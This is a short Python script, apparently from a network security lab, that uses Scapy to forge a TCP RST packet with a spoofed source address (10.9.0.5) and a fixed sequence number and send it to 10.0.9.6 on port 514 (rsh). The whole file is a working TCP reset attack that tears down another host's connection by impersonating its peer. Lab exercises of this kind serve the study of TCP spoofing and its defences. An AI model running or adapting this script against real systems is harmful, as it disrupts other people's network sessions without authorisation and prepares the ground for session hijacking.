from scapy.all import *
import sys

print("Sending Spoofed RST Packet ...")
IPLayer = IP(src="10.9.0.5", dst="10.0.9.6")
TCPLayer = TCP(sport=1023,dport=514,flags="R", seq=3821295304)
pkt = IPLayer/TCPLayer
send(pkt,verbose=0)